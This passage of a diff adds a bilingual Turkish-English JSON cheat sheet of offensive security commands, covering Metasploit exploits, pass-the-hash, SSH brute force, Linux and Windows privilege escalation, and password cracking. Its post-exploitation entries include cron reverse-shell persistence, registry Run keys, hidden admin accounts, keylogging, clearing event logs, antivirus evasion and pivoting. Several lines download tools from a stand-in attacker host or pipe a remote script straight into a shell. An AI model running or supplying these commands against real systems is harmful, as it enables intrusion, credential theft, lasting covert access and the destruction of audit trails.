+        "en": "A famous hidden backdoor intentionally placed in an FTP server version (vsftpd 2.3.4) triggered by a smiley face ':)'",
+        "syntax": "use exploit/unix/ftp/vsftpd_234_backdoor",
+        "ex": [
+          {
+            "c": "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.10\nexploit",
+            "tr": "Gülen yüz içeren bir kullanıcı adıyla giriş yapmaya çalışarak arka kapıyı tetikler ve root shell alınır.",
+            "en": "Trigger the backdoor by attempting to log in with a username containing a smiley face to get root shell."
+          }
+        ]
+      },
+      {
+        "name": "PsExec ile Pass The Hash (Güncelleme)",
+        "tr": "Kullanıcının şifresini bilmeden, sadece NTLM hash değerini kullanarak SMB üzerinden oturum açıp shell alma.",
+        "en": "Logging in over SMB and getting a shell using only the NTLM hash value, without knowing the user's password.",
+        "syntax": "set SMBPass [LM_Hash]:[NTLM_Hash]",
+        "ex": [
+          {
+            "c": "use exploit/windows/smb/psexec\nset SMBUser Administrator\nset SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\nexploit",
+            "tr": "Administrator kullanıcısının (Mimikatz vb. ile) ele geçirilen Hash'ini SMBPass olarak ayarla ve bağlan.",
+            "en": "Set the captured Hash of the Administrator user (via Mimikatz etc.) as SMBPass and connect."
+          }
+        ]
+      },
+      {
+        "name": "SSH Brute-Force (ssh_login)",
+        "tr": "SSH servisine yönelik kaba kuvvet (Brute-Force) sözlük saldırısı yaparak geçerli kimlik bilgilerini bulma modülü.",
+        "en": "Module for conducting Brute-Force dictionary attacks against the SSH service to find valid credentials.",
+        "syntax": "use auxiliary/scanner/ssh/ssh_login",
+        "ex": [
+          {
+            "c": "use auxiliary/scanner/ssh/ssh_login\nset RHOSTS 192.168.1.10\nset USER_FILE users.txt\nset PASS_FILE passwords.txt\nrun",
+            "tr": "Belirtilen kullanıcı adı ve şifre listelerini kullanarak hedefin SSH servisine otomatik giriş denemeleri yap.",
+            "en": "Automatically attempt logins to the target's SSH service using specified username and password lists."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "privilegeEscalation",
+    "cmds": [
+      {
+        "name": "linpeas",
+        "tr": "Linux sistemlerde yetki yükseltme (PrivEsc) açıklarını arayan otomatize script.",
+        "en": "Automated script that searches for privilege escalation paths on Linux.",
+        "syntax": "./linpeas.sh",
+        "ex": [
+          {
+            "c": "wget http://attacker_ip/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh",
+            "tr": "Hedefte indir ve çalıştır",
+            "en": "Download and run on target"
+          }
+        ]
+      },
+      {
+        "name": "pspy",
+        "tr": "Linux süreçlerini root yetkisi olmadan gerçek zamanlı izler (Cron job tespiti vb.).",
+        "en": "Snoop on Linux processes in real-time without root privileges.",
+        "syntax": "./pspy[32|64]",
+        "ex": [
+          {
+            "c": "./pspy64",
+            "tr": "Süreç izleyiciyi çalıştır",
+            "en": "Run process snooper"
+          }
+        ]
+      },
+      {
+        "name": "GTFOBins",
+        "tr": "Yanlış yapılandırılmış meşru binary'leri (SUID, sudo vb.) kullanarak yetki yükseltme rehberi.",
+        "en": "Privilege escalation guide using misconfigured legitimate binaries.",
+        "syntax": "Konsept / Araç",
+        "ex": [
+          {
+            "c": "sudo find . -exec /bin/sh \\; -quit",
+            "tr": "Sudo yetkili 'find' komutu ile root shell al",
+            "en": "Get root shell using sudo 'find'"
+          },
+          {
+            "c": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "tr": "Kısıtlı shell'den interaktif (TTY) shell'e geçiş (Önemli PrivEsc adımı)",
+            "en": "Spawn interactive TTY shell from restricted shell"
+          }
+        ]
+      },
+      {
+        "name": "Windows Exploit Suggester",
+        "tr": "Hedef makinenin 'systeminfo' çıktısını analiz edip, yama yapılmamış olası Privilege Escalation açıklarını öneren araç.",
+        "en": "Tool that analyzes 'systeminfo' output to suggest potential unpatched Privilege Escalation exploits.",
+        "syntax": "python windows-exploit-suggester.py --database [db] --systeminfo [info.txt]",
+        "ex": [
+          {
+            "c": "python windows-exploit-suggester.py --database 2021-10-10-mssb.xls --systeminfo sysinfo.txt",
+            "tr": "Kurbandan alınan sysinfo.txt dosyasını analiz et ve muhtemel Kernel açıklarını listele.",
+            "en": "Analyze sysinfo.txt from victim and list probable Kernel exploits."
+          }
+        ]
+      },
+      {
+        "name": "Windows Kernel Exploits",
+        "tr": "Github üzerinde derlenmiş (precompiled) veya kaynak kodu olan Windows kernel yetki yükseltme açıkları deposu.",
+        "en": "Repository of precompiled or source Windows kernel privilege escalation exploits on Github.",
+        "syntax": "Github Repo (SecWiki)",
+        "ex": [
+          {
+            "c": "git clone https://github.com/SecWiki/windows-kernel-exploits.git",
+            "tr": "Önerilen exploit'i (örn: MS15-051) bu depodan bulup hedefe yükle ve çalıştır.",
+            "en": "Find suggested exploit (e.g. MS15-051) from this repo, upload to target and execute."
+          }
+        ]
+      },
+      {
+        "name": "UACME ile UAC'yi Atlatma",
+        "tr": "Windows Kullanıcı Hesabı Denetimi (UAC) pencerelerini sessizce atlatarak yönetici (High Integrity) yetkisi almak.",
+        "en": "Bypassing Windows User Account Control (UAC) prompts silently to get High Integrity admin shell.",
+        "syntax": "akagi32.exe / akagi64.exe [Yöntem_ID] [Zararlı_Dosya]",
+        "ex": [
+          {
+            "c": "akagi64.exe 23 c:\\temp\\payload.exe",
+            "tr": "UACME aracı ile 23 numaralı yöntemi (pkgmgr.exe) kullanarak payload'ı sessizce yönetici olarak çalıştır.",
+            "en": "Use UACME with method #23 (pkgmgr.exe) to silently execute payload as admin."
+          }
+        ]
+      },
+      {
+        "name": "Zayıf Yetkilendirmeler (Weak Permissions)",
+        "tr": "Linux sistemlerde yanlışlıkla okuma/yazma izni verilmiş kritik dosyaları (örn: /etc/shadow, /etc/passwd) sömürerek yetki yükseltme.",
+        "en": "Privilege escalation by exploiting critical files (e.g., /etc/shadow, /etc/passwd) accidentally given read/write permissions on Linux.",
+        "syntax": "ls -l /etc/passwd /etc/shadow",
+        "ex": [
+          {
+            "c": "ls -l /etc/shadow",
+            "tr": "Eğer shadow dosyasında okuma (read) izni varsa, içindeki şifreli hashleri çalıp kendi bilgisayarında kırabilirsin.",
+            "en": "If shadow file has read permission, you can steal the hashed passwords and crack them on your machine."
+          },
+          {
+            "c": "echo 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd",
+            "tr": "Eğer passwd dosyasında yazma (write) izni varsa, kendini 0 id'li (root yetkili) yeni bir kullanıcı olarak sisteme ekle.",
+            "en": "If passwd file has write permission, append yourself as a new user with id 0 (root privileges)."
+          }
+        ]
+      },
+      {
+        "name": "Sudo Privileges (Sudo Yetkileri)",
+        "tr": "Şifre sormadan (NOPASSWD) sudo ile çalıştırılabilen programları kullanarak root shell alma taktikleri (GTFOBins referansı).",
+        "en": "Tactics for getting a root shell using programs that can be run with sudo without a password (NOPASSWD) (GTFOBins reference).",
+        "syntax": "sudo -l",
+        "ex": [
+          {
+            "c": "sudo -l",
+            "tr": "Önce hangi komutları root olarak parolasız çalıştırabildiğini kontrol et.",
+            "en": "First, check which commands you can run as root without a password."
+          },
+          {
+            "c": "sudo find . -exec /bin/sh \\; -quit",
+            "tr": "Eğer 'find' komutunu sudo ile kullanabiliyorsan, find üzerinden root yetkisinde terminal (shell) aç.",
+            "en": "If you can use 'find' with sudo, spawn a root shell through find."
+          }
+        ]
+      },
+      {
+        "name": "Windows Yetki Yükseltme Yolları",
+        "tr": "Windows sistemlerde yaygın olarak karşılaşılan yerel zafiyetler (Unquoted Service Path, AlwaysInstallElevated vb.).",
+        "en": "Common local vulnerabilities found on Windows systems (Unquoted Service Path, AlwaysInstallElevated, etc.).",
+        "syntax": "wmic / reg query",
+        "ex": [
+          {
+            "c": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"",
+            "tr": "Unquoted Service Path: Tırnak içine alınmamış ve boşluk içeren servis yollarını bul (Araya zararlı exe sıkıştırmak için).",
+            "en": "Unquoted Service Path: Find unquoted service paths with spaces (to inject malicious exe in between)."
+          },
+          {
+            "c": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+            "tr": "AlwaysInstallElevated: Eğer bu değer 1 ise, herhangi bir normal kullanıcı zararlı bir .msi paketini 'SYSTEM' yetkisiyle kurabilir.",
+            "en": "AlwaysInstallElevated: If this value is 1, any normal user can install a malicious .msi package with 'SYSTEM' privileges."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "postExploitation",
+    "cmds": [
+      {
+        "name": "Shell'i Meterpreter'a Yükseltme",
+        "tr": "Standart ve kısıtlı bir komut satırını (shell), Metasploit'in çok yetenekli Meterpreter shell'ine dönüştürme.",
+        "en": "Upgrading a standard command shell to a highly capable Meterpreter shell.",
+        "syntax": "sessions -u [session_id]",
+        "ex": [
+          {
+            "c": "sessions -u 1",
+            "tr": "Arka plandaki 1 numaralı standart shell'i meterpreter'a yükseltir.",
+            "en": "Upgrades standard shell session 1 in the background to a meterpreter session."
+          },
+          {
+            "c": "use post/multi/manage/shell_to_meterpreter\nset SESSION 1\nrun",
+            "tr": "Aynı işlemi yapan alternatif yükseltme modülü.",
+            "en": "Alternative upgrade module performing the same action."
+          }
+        ]
+      },
+      {
+        "name": "Windows'ta Kalıcılık Oluşturma (Persistence)",
+        "tr": "Hedef bilgisayar yeniden başlatılsa bile saldırganın yetkili bağlantısının devam etmesini sağlama.",
+        "en": "Ensuring the attacker's privileged connection persists even if the target machine reboots.",
+        "syntax": "run persistence [secenekler]",
+        "ex": [
+          {
+            "c": "run persistence -X -i 5 -p 4444 -r [Kendi_IP]",
+            "tr": "-X ile sistemi açılışında çalışacak kayıt defteri (Registry) anahtarı ekle ve her 5 saniyede bir bağlanmaya çalış.",
+            "en": "Add Registry key to run at boot (-X) and attempt to connect every 5 seconds."
+          }
+        ]
+      },
+      {
+        "name": "RDP Etkinleştirme (getgui)",
+        "tr": "Meterpreter üzerinden hedefteki Uzak Masaüstü (RDP) servisini gizlice açma.",
+        "en": "Silently enabling Remote Desktop (RDP) service on the target via Meterpreter.",
+        "syntax": "run getgui -e",
+        "ex": [
+          {
+            "c": "run getgui -e",
+            "tr": "RDP'yi aktif et ve Windows güvenlik duvarında 3389 portuna otomatik izin ver.",
+            "en": "Enable RDP and automatically allow port 3389 in Windows firewall."
+          },
+          {
+            "c": "run getgui -u hacker -p 123456",
+            "tr": "RDP erişimi için 'hacker' adında yeni bir gizli yönetici hesabı oluşturur.",
+            "en": "Creates a new hidden admin account 'hacker' for RDP access."
+          }
+        ]
+      },
+      {
+        "name": "Windows Keylogging",
+        "tr": "Kurbanın klavyede bastığı tüm tuşları (şifreler, mesajlar) kaydetme ve okuma.",
+        "en": "Recording and reading all keystrokes (passwords, messages) typed by the victim.",
+        "syntax": "keyscan_start / keyscan_dump",
+        "ex": [
+          {
+            "c": "keyscan_start",
+            "tr": "Klavye dinlemeyi arka planda başlat (İşlemi gizlemek için önce explorer.exe içine 'migrate' olmak gerekir).",
+            "en": "Start keylogging in the background (Must 'migrate' to explorer.exe first to hide)."
+          },
+          {
+            "c": "keyscan_dump",
+            "tr": "O ana kadar yazılan tüm tuş vuruşlarını ekrana basar.",
+            "en": "Dumps all recorded keystrokes up to that moment to the screen."
+          }
+        ]
+      },
+      {
+        "name": "Olay Günlüklerini Temizleme (Clearev)",
+        "tr": "Sistemdeki tüm izleri kaybettirmek için Windows Olay Görüntüleyicisi (Event Viewer) kayıtlarını silme.",
+        "en": "Clearing Windows Event Viewer logs to cover all tracks in the system.",
+        "syntax": "clearev",
+        "ex": [
+          {
+            "c": "clearev",
+            "tr": "Meterpreter üzerinden Application, System ve Security (Uygulama, Sistem, Güvenlik) loglarını tek tuşla siler.",
+            "en": "Clears Application, System, and Security logs with one command via Meterpreter."
+          }
+        ]
+      },
+      {
+        "name": "Sistem Numaralandırma (enum_system)",
+        "tr": "Meterpreter oturumu açıldıktan sonra hedef sistemin (Linux/Windows) donanım, ağ ve işletim sistemi özetini çıkarır.",
+        "en": "Extracts hardware, network, and OS summary of the target system (Linux/Windows) after a Meterpreter session is established.",
+        "syntax": "run post/[platform]/gather/enum_system",
+        "ex": [
+          {
+            "c": "run post/linux/gather/enum_system",
+            "tr": "Linux hedefinden detaylı sistem bilgilerini (Kernel, Dağıtım vb.) otomatik topla.",
+            "en": "Automatically gather detailed system info (Kernel, Distro, etc.) from Linux target."
+          },
+          {
+            "c": "run post/windows/gather/enum_system",
+            "tr": "Windows hedefinden ortam değişkenleri, kurulu güncellemeler ve sistem detaylarını topla.",
+            "en": "Gather environment variables, installed updates, and system details from Windows target."
+          }
+        ]
+      },
+      {
+        "name": "Koruma Analizi (enum_protections)",
+        "tr": "Hedefte aktif olan güvenlik mekanizmalarını (ASLR, SMEP, SELinux, AppArmor) tespit eder.",
+        "en": "Detects active security mechanisms on the target (ASLR, SMEP, SELinux, AppArmor).",
+        "syntax": "run post/linux/gather/enum_protections",
+        "ex": [
+          {
+            "c": "run post/linux/gather/enum_protections",
+            "tr": "Linux üzerinde hangi çekirdek (kernel) korumalarının aktif olduğunu görerek exploit seçimini kolaylaştır.",
+            "en": "Check which kernel protections are active on Linux to facilitate exploit selection."
+          }
+        ]
+      },
+      {
+        "name": "Yapılandırma Analizi (enum_configs)",
+        "tr": "Hedef sistemdeki kritik konfigürasyon dosyalarını (örn: sshd_config, apache2.conf) bulup çeker.",
+        "en": "Finds and downloads critical configuration files on the target system (e.g., sshd_config, apache2.conf).",
+        "syntax": "run post/linux/gather/enum_configs",
+        "ex": [
+          {
+            "c": "run post/linux/gather/enum_configs",
+            "tr": "Linux hedefindeki tüm servis ayar dosyalarını toplayarak olası zafiyetleri incele.",
+            "en": "Gather all service config files on Linux target to investigate potential vulnerabilities."
+          }
+        ]
+      },
+      {
+        "name": "Kullanıcı Geçmişi (enum_users_history)",
+        "tr": "Sistemdeki tüm kullanıcıların komut geçmişini (.bash_history) okuyarak unutulmuş şifreleri arar.",
+        "en": "Reads the command history (.bash_history) of all users on the system to look for forgotten passwords.",
+        "syntax": "run post/linux/gather/enum_users_history",
+        "ex": [
+          {
+            "c": "run post/linux/gather/enum_users_history",
+            "tr": "Adminlerin terminalde yanlışlıkla düz metin (plaintext) olarak yazdığı şifreleri bul.",
+            "en": "Find passwords accidentally typed in plaintext by admins in the terminal."
+          }
+        ]
+      },
+      {
+        "name": "Sanal Makine Kontrolü (checkvm)",
+        "tr": "Ele geçirilen sistemin gerçek bir fiziksel makine mi yoksa sanal makine (VMware, VirtualBox) mi olduğunu anlar.",
+        "en": "Determines if the compromised system is a real physical machine or a virtual machine (VMware, VirtualBox).",
+        "syntax": "run post/[platform]/gather/checkvm",
+        "ex": [
+          {
+            "c": "run post/linux/gather/checkvm",
+            "tr": "Linux makinenin sanallaştırma kullanıp kullanmadığını (Honeypot analizi için) tespit et.",
+            "en": "Detect if the Linux machine uses virtualization (useful for Honeypot analysis)."
+          }
+        ]
+      },
+      {
+        "name": "Named Pipe Numaralandırması (is_known_pipename)",
+        "tr": "Windows ağlarındaki adlandırılmış veri yollarını (Named Pipes) analiz ederek SMB servis zafiyetlerini kontrol eder.",
+        "en": "Analyzes Named Pipes in Windows networks to check for SMB service vulnerabilities.",
+        "syntax": "use auxiliary/scanner/smb/pipe_auditor",
+        "ex": [
+          {
+            "c": "use auxiliary/scanner/smb/pipe_auditor\nset RHOSTS 192.168.1.10\nrun",
+            "tr": "Hedefteki bilinen Named Pipe'ları (browser, spoolss vb.) listeleyerek yanal hareket (lateral movement) yollarını bul.",
+            "en": "List known Named Pipes (browser, spoolss, etc.) on the target to find lateral movement paths."
+          }
+        ]
+      },
+      {
+        "name": "Shellter ile AV Atlatma (Evasion)",
+        "tr": "Zararlı yazılımları (payload), yasal ve temiz uygulamaların (örn: putty.exe) içine polimorfik olarak gizleyerek Antivirüsleri (AV) atlatma aracı.",
+        "en": "Tool for evading Antiviruses by polymorphically hiding malware (payload) inside legitimate applications.",
+        "syntax": "shellter",
+        "ex": [
+          {
+            "c": "shellter",
+            "tr": "Shellter arayüzünü başlat, 'Auto' modunu seçip temiz bir PE (.exe) dosyasına payload enjekte et.",
+            "en": "Start Shellter interface, select 'Auto' mode and inject payload into a clean PE (.exe) file."
+          }
+        ]
+      },
+      {
+        "name": "PowerShell Kod Gizleme (Obfuscation)",
+        "tr": "Zararlı PowerShell betiklerinin güvenlik yazılımlarına (AMSI) yakalanmaması için kodlarını karmaşıklaştırma.",
+        "en": "Obfuscating malicious PowerShell scripts to avoid detection by security software (AMSI).",
+        "syntax": "Invoke-Obfuscation",
+        "ex": [
+          {
+            "c": "Import-Module ./Invoke-Obfuscation.psd1\nInvoke-Obfuscation",
+            "tr": "Araç çalıştırıldıktan sonra, script yolunu verip 'ENCODING' gibi metotlarla zararlı kodu okunamaz (gizli) hale getir.",
+            "en": "After running the tool, provide script path and obfuscate code using methods like 'ENCODING'."
+          }
+        ]
+      },
+      {
+        "name": "Windows: Yerel Numaralandırma (Local Enum)",
+        "tr": "Windows hedefine sızdıktan sonra yetki yükseltmek için; kullanıcı, ağ, süreç ve hizmet bilgilerini manuel olarak toplama.",
+        "en": "Manually gathering user, network, process, and service info after breaching a Windows target to escalate privileges.",
+        "syntax": "cmd komutları",
+        "ex": [
+          {
+            "c": "net users && net localgroup administrators",
+            "tr": "Kullanıcı/Grup Numaralandırması: Sistemdeki tüm kullanıcıları ve admin grubundaki üyeleri listele.",
+            "en": "User/Group Enum: List all users on the system and members of the admin group."
+          },
+          {
+            "c": "ipconfig /all && arp -a && route print",
+            "tr": "Ağ Numaralandırması: Ağ yapılandırmasını, ARP tablosunu ve yönlendirme (routing) kurallarını görüntüle.",
+            "en": "Network Enum: View network configuration, ARP table, and routing rules."
+          },
+          {
+            "c": "tasklist /SVC && schtasks /query /fo LIST /v",
+            "tr": "Süreç/Hizmet Numaralandırması: Çalışan tüm süreçleri, hizmetleri ve zamanlanmış görevleri (Scheduled Tasks) listele.",
+            "en": "Process/Service Enum: List all running processes, services, and scheduled tasks."
+          }
+        ]
+      },
+      {
+        "name": "Linux: Yerel Numaralandırma (Local Enum)",
+        "tr": "Linux hedefine sızdıktan sonra yetki yükseltmek için; kullanıcı, ağ, süreç ve zamanlanmış görev bilgilerini manuel toplama.",
+        "en": "Manually gathering user, network, process, and cron job info after breaching a Linux target to escalate privileges.",
+        "syntax": "bash komutları",
+        "ex": [
+          {
+            "c": "cat /etc/passwd | grep sh$",
+            "tr": "Kullanıcı/Grup Numaralandırması: Sistemde geçerli bir terminale (shell) sahip olan gerçek kullanıcıları listele.",
+            "en": "User/Group Enum: List real users with a valid shell on the system."
+          },
+          {
+            "c": "ifconfig -a && arp -a && netstat -antp",
+            "tr": "Ağ Numaralandırması: Ağ arayüzlerini, ARP önbelleğini ve aktif ağ bağlantılarını/portları listele.",
+            "en": "Network Enum: List network interfaces, ARP cache, and active network connections/ports."
+          },
+          {
+            "c": "ps aux && cat /etc/crontab && ls -la /etc/cron.*",
+            "tr": "Süreç/Hizmet Numaralandırması: Çalışan süreçleri ve sistem genelindeki zamanlanmış görevleri (Cron Jobs) kontrol et.",
+            "en": "Process/Service Enum: Check running processes and system-wide scheduled tasks (Cron Jobs)."
+          }
+        ]
+      },
+      {
+        "name": "Otomatik Yerel Numaralandırma (Enum Scripts)",
+        "tr": "Sisteme sızdıktan sonra tüm yetki yükseltme açıklarını otomatik olarak tarayan popüler scriptlerin (winPEAS/linPEAS) kullanımı.",
+        "en": "Using popular scripts (winPEAS/linPEAS) that automatically scan for all privilege escalation vulnerabilities after breaching a system.",
+        "syntax": "winPEAS.exe / linpeas.sh",
+        "ex": [
+          {
+            "c": "winPEASany.exe quiet cmd fast",
+            "tr": "Windows hedefinde winPEAS aracını hızlı ve detayları gizleyerek (sadece önemli olanları göstererek) çalıştır.",
+            "en": "Run winPEAS on Windows target fast and hiding details (only showing important findings)."
+          },
+          {
+            "c": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+            "tr": "Linux hedefinde linPEAS aracını internetten doğrudan belleğe indir ve çalıştır.",
+            "en": "Download linPEAS from the internet directly to memory on Linux target and execute."
+          }
+        ]
+      },
+      {
+        "name": "Dosyaları Hedefe Aktarma (File Transfer)",
+        "tr": "Saldırganın makinesindeki araçları (exploit, PEAS scripti) kurban makineye (Linux/Windows) indirme (transfer) teknikleri.",
+        "en": "Techniques to download tools (exploits, PEAS scripts) from attacker's machine to victim machine (Linux/Windows).",
+        "syntax": "http.server / wget / certutil",
+        "ex": [
+          {
+            "c": "python3 -m http.server 80",
+            "tr": "[Saldırgan Makinesi] Bulunduğunuz dizindeki dosyaları paylaşmak için basit bir web sunucusu başlatın.",
+            "en": "[Attacker Machine] Start a simple web server to share files in the current directory."
+          },
+          {
+            "c": "certutil -urlcache -f -split http://10.0.0.1/winpeas.exe winpeas.exe",
+            "tr": "[Windows Hedef] certutil kullanarak komut satırından HTTP üzerinden dosya indir.",
+            "en": "[Windows Target] Download file over HTTP from command line using certutil."
+          },
+          {
+            "c": "Invoke-WebRequest -Uri http://10.0.0.1/winpeas.exe -OutFile winpeas.exe",
+            "tr": "[Windows Hedef] PowerShell (wget alternatifi) kullanarak dosya indir.",
+            "en": "[Windows Target] Download file using PowerShell (wget alternative)."
+          },
+          {
+            "c": "wget http://10.0.0.1/linpeas.sh -O linpeas.sh",
+            "tr": "[Linux Hedef] wget aracı ile komut satırından dosya indir.",
+            "en": "[Linux Target] Download file from command line using wget."
+          }
+        ]
+      },
+      {
+        "name": "Etkileşimli Olmayan Shell'i Yükseltme (Upgrade to Interactive TTY)",
+        "tr": "Netcat ile alınan basit shell'leri tam etkileşimli, sekme tamamlama (tab) çalışan ve CTRL+C yapınca kapanmayan Bash terminaline dönüştürme.",
+        "en": "Converting simple Netcat shells into fully interactive Bash terminals with tab completion where CTRL+C doesn't kill the session.",
+        "syntax": "python -c 'import pty...'",
+        "ex": [
+          {
+            "c": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "tr": "1. Adım: Netcat shell'i aldıktan sonra Python ile sahte terminal (PTY) başlat.",
+            "en": "Step 1: Start pseudo-terminal (PTY) with Python after getting Netcat shell."
+          },
+          {
+            "c": "CTRL+Z\nstty raw -echo; fg\nexport TERM=xterm",
+            "tr": "2. Adım: Shell'i arka plana at, stty ayarlarını değiştirip geri getir ve TERM değişkenini ayarla (Artık CTRL+C güvenli).",
+            "en": "Step 2: Background shell, change stty settings, bring back to foreground and set TERM variable (CTRL+C is now safe)."
+          }
+        ]
+      },
+      {
+        "name": "SSH Key (Anahtar) ile Kalıcılık (Linux)",
+        "tr": "Hedef Linux sunucuda ~/.ssh/authorized_keys dosyasına kendi açık anahtarını (public key) ekleyerek parolasız kalıcılık sağlama.",
+        "en": "Ensuring passwordless persistence by adding your public key to the ~/.ssh/authorized_keys file on the target Linux server.",
+        "syntax": "ssh-keygen / echo id_rsa.pub >> authorized_keys",
+        "ex": [
+          {
+            "c": "ssh-keygen -t rsa -b 4096",
+            "tr": "Saldırgan kendi makinesinde yeni bir RSA SSH anahtar çifti oluşturur.",
+            "en": "Attacker generates a new RSA SSH key pair on their own machine."
+          },
+          {
+            "c": "echo 'ssh-rsa AAAAB3N...' >> /root/.ssh/authorized_keys",
+            "tr": "Kurban makinede (root olunduysa) public key authorized_keys dosyasına eklenir. Artık dışarıdan şifresiz 'ssh root@IP' yapılabilir.",
+            "en": "On victim machine (if root), append public key to authorized_keys. You can now login passwordless via 'ssh root@IP'."
+          }
+        ]
+      },
+      {
+        "name": "Cron Jobs (Zamanlanmış Görev) ile Kalıcılık",
+        "tr": "Linux sistemlerde belirli aralıklarla zararlı bir betiği otomatik çalıştırarak (Cron) bağlantı sürekliliğini sağlama.",
+        "en": "Ensuring connection persistence by automatically running a malicious script at regular intervals (Cron) on Linux systems.",
+        "syntax": "crontab -e",
+        "ex": [
+          {
+            "c": "echo '* * * * * root /tmp/reverse_shell.sh' >> /etc/crontab",
+            "tr": "Sistem genelindeki crontab'a ekleme yap: Her dakika root yetkisiyle ters bağlantı (reverse shell) betiğini çalıştır.",
+            "en": "Add to system-wide crontab: Run reverse shell script as root every minute."
+          }
+        ]
+      },
+      {
+        "name": "Windows'ta Sürekliliği Sağlamak (Registry Kalıcılığı)",
+        "tr": "Windows kayıt defterindeki (Registry) başlangıç anahtarlarına zararlı yazılımı (payload) ekleyerek cihaz her açıldığında bağlantı alma.",
+        "en": "Adding malware (payload) to Windows Registry startup keys to get a connection every time the device boots.",
+        "syntax": "reg add",
+        "ex": [
+          {
+            "c": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Guncelleme\" /t REG_SZ /d \"C:\\temp\\shell.exe\" /f",
+            "tr": "Kullanıcı her oturum açtığında C:\\temp altındaki shell.exe'yi otomatik çalıştıracak gizli bir 'Run' kaydı oluştur.",
+            "en": "Create a hidden 'Run' record that auto-starts shell.exe under C:\\temp every time the user logs in."
+          }
+        ]
+      },
+      {
+        "name": "RDP Yoluyla Kalıcılık",
+        "tr": "Uzak Masaüstü Bağlantısı'nı (RDP) etkinleştirerek (daha önce eklenen getgui komutuna ek olarak) ve kullanıcıları RDP grubuna ekleyerek GUI erişimini koruma.",
+        "en": "Maintaining GUI access by enabling Remote Desktop Connection (RDP) and adding users to the RDP group.",
+        "syntax": "net localgroup",
+        "ex": [
+          {
+            "c": "net user hacker Password123 /add && net localgroup Administrators hacker /add",
+            "tr": "Yeni bir 'hacker' kullanıcısı oluştur ve onu Yöneticiler (Administrators) grubuna ekle.",
+            "en": "Create a new 'hacker' user and add them to the Administrators group."
+          },
+          {
+            "c": "net localgroup \"Remote Desktop Users\" hacker /add",
+            "tr": "Kullanıcıyı RDP yapabilmesi için 'Uzak Masaüstü Kullanıcıları' grubuna dahil et.",
+            "en": "Add the user to the 'Remote Desktop Users' group so they can use RDP."
+          }
+        ]
+      },
+      {
+        "name": "Pivoting (Sıçrama / Tünelleme Saldırısı)",
+        "tr": "Ele geçirilen bir makineyi köprü (proxy) olarak kullanarak, dışarıdan erişilemeyen iç ağdaki (Internal Network) diğer makinelere sıçrama.",
+        "en": "Using a compromised machine as a bridge (proxy) to jump to other machines on the internal network that are inaccessible from the outside.",
+        "syntax": "ssh -D / meterpreter autoroute / proxychains",
+        "ex": [
+          {
+            "c": "ssh -D 9050 user@10.0.0.1",
+            "tr": "SSH Dinamik Port Yönlendirme (Dynamic Port Forwarding): Kurban makine üzerinden 9050 portunda bir SOCKS proxy açar.",
+            "en": "SSH Dynamic Port Forwarding: Opens a SOCKS proxy on port 9050 through the victim machine."
+          },
+          {
+            "c": "proxychains nmap -sT -p 80 192.168.2.10",
+            "tr": "Açılan SSH proxy tünelini kullanarak (Proxychains), normalde göremediğin gizli iç ağdaki (192.168.2.x) makineye Nmap taraması yap.",
+            "en": "Use the opened SSH proxy tunnel (Proxychains) to scan a machine on the hidden internal network (192.168.2.x) that you normally can't see."
+          },
+          {
+            "c": "run autoroute -s 192.168.2.0/24",
+            "tr": "Meterpreter üzerinden: Ele geçirilen makinenin bulunduğu diğer iç ağı (192.168.2.x) Metasploit yönlendirme tablona ekle.",
+            "en": "Via Meterpreter: Add the other internal network (192.168.2.x) where the compromised machine is located to your Metasploit routing table."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "passwordCracking",
+    "cmds": [
+      {
+        "name": "hash-identifier",
+        "tr": "Bilinmeyen bir hash'in algoritma türünü tahmin eder.",
+        "en": "Predicts the algorithm type of an unknown hash.",
+        "syntax": "hash-identifier",
+        "ex": [
+          {
+            "c": "hash-identifier",
+            "tr": "Aracı başlat ve hash'i yapıştır",
+            "en": "Start tool and paste hash"
+          }
+        ]
+      },
+      {
+        "name": "hashcat",
+        "tr": "GPU tabanlı, dünyanın en hızlı parola kırma aracı.",
+        "en": "World's fastest, GPU-based password recovery utility.",
+        "syntax": "hashcat [options]... hashfile [dictionary]",
+        "ex": [
+          {
+            "c": "hashcat -m 1000 -a 0 hash.txt rockyou.txt",
+            "tr": "NTLM hash'ine sözlük (wordlist) saldırısı",
+            "en": "Dictionary attack on NTLM hash"
+          }
+        ]
+      },
+      {
+        "name": "john",
+        "tr": "John the Ripper - Çok yönlü ve CPU tabanlı parola kırıcı.",
+        "en": "John the Ripper - Versatile CPU-based password cracker.",
+        "syntax": "john [options] [hashfile]",
+        "ex": [
+          {
+            "c": "john --wordlist=rockyou.txt hash.txt",
+            "tr": "Sözlük saldırısı başlat",
+            "en": "Start dictionary attack"
+          },
+          {
+            "c": "john --show hash.txt",
+            "tr": "Kırılan parolaları listele",
+            "en": "List cracked passwords"
+          }
+        ]
+      },
+      {
+        "name": "hydra",
+        "tr": "Ağ servisleri için paralel login brute-force aracı (Credential Stuffing / Brute Force).",
+        "en": "Parallelized login brute-force cracker for network services.",
+        "syntax": "hydra [options] target service",
+        "ex": [
+          {
+            "c": "hydra -l admin -P rockyou.txt ssh://192.168.1.10 -t 4",
+            "tr": "SSH servisine kaba kuvvet saldırısı (4 threads)",
+            "en": "Brute-force SSH service (4 threads)"
+          }
+        ]
+      },
+      {
+        "name": "fcrackzip",
+        "tr": "ZIP arşivleri için parola kırma aracı.",
+        "en": "Password cracker for ZIP archives.",
+        "syntax": "fcrackzip [options] file.zip",
+        "ex": [
+          {
+            "c": "fcrackzip -v -D -u -p rockyou.txt dosya.zip",
+            "tr": "ZIP dosyasına sözlük saldırısı (-u ile doğrula)",
+            "en": "Dictionary attack on ZIP (verify with -u)"
+          }
+        ]
+      },
+      {
